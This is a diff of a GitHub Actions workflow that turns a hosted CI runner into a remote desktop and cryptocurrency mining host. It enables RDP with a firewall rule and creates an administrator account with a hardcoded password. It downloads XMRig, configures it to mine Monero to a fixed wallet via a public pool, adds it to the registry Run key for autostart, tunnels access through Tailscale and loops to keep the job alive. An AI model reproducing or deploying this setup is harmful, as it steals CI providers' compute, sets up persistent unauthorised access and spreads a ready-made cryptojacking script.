@@ -1,4 +1,4 @@
-name: RDP TEST with Auto-Start Miner (Final Version)
+name: RDP TEST with Auto-Start Miner (Final Corrected Version)
 
 on:
   workflow_dispatch:
@@ -10,11 +10,13 @@ jobs:
 
     steps:
       - name: Configure Core RDP Settings
+        shell: powershell
         run: |
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
           netsh advfirewall firewall add rule name="Allow RDP" dir=in action=allow protocol=TCP localport=3389
 
       - name: Create RDP User with Static Password
+        shell: powershell
         run: |
           $password = "Runner-12345"
           $securePass = ConvertTo-SecureString $password -AsPlainText -Force
@@ -22,72 +24,71 @@ jobs:
           Add-LocalGroupMember -Group "Administrators" -Member "RDP"
           Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
           echo "RDP_PASSWORD=$password" >> $env:GITHUB_ENV
-          if (-not (Get-LocalUser -Name "RDP")) { Write-Error "User creation failed"; exit 1 }
 
-      - name: Install and Configure XMRig Miner
+      - name: Install, Configure, and Set Auto-Start
         shell: powershell
         run: |
-          $ErrorActionPreference = "Stop"
+          # --- This script is now one single, robust block ---
+          $ErrorActionPreference = "Stop" # Fail on any error
+          
+          # --- 1. Setup Paths and Variables ---
           $minerVersion = "6.21.2"
           $downloadUrl = "https://github.com/xmrig/xmrig/releases/download/v$($minerVersion)/xmrig-$($minerVersion)-msvc-win64.zip"
           $zipPath = "$env:TEMP\xmrig.zip"
           $desktopPath = "C:\Users\RDP\Desktop"
           
-          Write-Host "Ensuring Desktop directory exists at $desktopPath..."
+          Write-Host "Ensuring Desktop directory exists..."
           New-Item -ItemType Directory -Force -Path $desktopPath
           
+          # --- 2. Download and Extract ---
           Write-Host "Downloading XMRig v$($minerVersion)..."
           Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath
           
-          Write-Host "Extracting XMRig to the RDP user's Desktop..."
+          Write-Host "Extracting XMRig to Desktop..."
           Expand-Archive -Path $zipPath -DestinationPath $desktopPath -Force
           
           $minerFolder = (Get-ChildItem -Path $desktopPath -Directory | Where-Object { $_.Name -like 'xmrig*' }).FullName
-          if (-not $minerFolder) { Write-Error "Could not find extracted XMRig folder!"; exit 1 }
+          if (-not $minerFolder) { throw "CRITICAL: Could not find extracted XMRig folder!" }
           Write-Host "Found miner folder: $minerFolder"
+
+          # --- 3. Verify Miner Exists ---
+          $exePath = Join-Path $minerFolder "xmrig.exe"
+          if (-not (Test-Path $exePath)) { throw "CRITICAL: xmrig.exe not found after extraction!" }
+          Write-Host "SUCCESS: xmrig.exe verified at $exePath"
           
+          # --- 4. Create Config Files ---
           $jsonContent = '{"autosave": true,"cpu": true,"opencl": false,"cuda": false,"pools": [{"algo": "rx/0","url": "pool.supportxmr.com:5555","user": "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP","pass": "x"}]}'
           $jsonContent | ConvertFrom-Json | ConvertTo-Json -Depth 100 | Set-Content -Path (Join-Path $minerFolder "config.json")
           Write-Host "config.json created."
 
+          $batPath = Join-Path $desktopPath "Start-Miner.bat"
           $batContent = "@echo off`r`ncd /d ""$($minerFolder)""`r`nxmrig.exe"
-          Set-Content -Path (Join-Path $desktopPath "Start-Miner.bat") -Value $batContent
+          Set-Content -Path $batPath -Value $batContent
           Write-Host "Start-Miner.bat created."
 
-      - name: Auto-start Miner via Registry
-        shell: powershell
-        run: |
-          $ErrorActionPreference = "Stop"
+          # --- 5. Set Auto-start via Registry ---
           $runKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-          $batPath = "C:\Users\RDP\Desktop\Start-Miner.bat"
-          
-          Write-Host "Adding miner to the registry for auto-start..."
+          Write-Host "Adding miner to registry for auto-start..."
           Set-ItemProperty -Path $runKey -Name "XMRigMiner" -Value $batPath -Force
-          
-          Write-Host "--- Verification Step ---"
-          $entry = Get-ItemProperty -Path $runKey -Name "XMRigMiner"
-          if ($entry.XMRigMiner -eq $batPath) {
-              Write-Host "SUCCESS: Registry entry created correctly."
-          } else {
-              Write-Error "FAILURE: Could not verify registry entry."
-          }
+          Write-Host "SUCCESS: Registry auto-start entry created."
 
       - name: Install Tailscale
+        shell: powershell
         run: |
           Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe" -OutFile "$env:TEMP\tailscale.exe"
           Start-Process "$env:TEMP\tailscale.exe" -ArgumentList "/quiet" -Wait
 
       - name: Establish Tailscale Connection
+        shell: powershell
         run: |
           & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
-          
           Start-Sleep -Seconds 10
           $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
-          
-          if (-not $tsIP) { Write-Error "Tailscale IP not assigned. Exiting."; exit 1 }
+          if (-not $tsIP) { throw "Tailscale IP not assigned." }
           echo "TAILSCALE_IP=$tsIP" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
       
       - name: Display RDP Connection Details
+        shell: powershell
         run: |
           Write-Host "================================================================"
           Write-Host "                 RDP ACCESS READY"
@@ -100,6 +101,7 @@ jobs:
           Write-Host "================================================================"
 
       - name: Maintain Connection
+        shell: powershell
         run: |
           while ($true) {
               Start-Sleep -Seconds 300
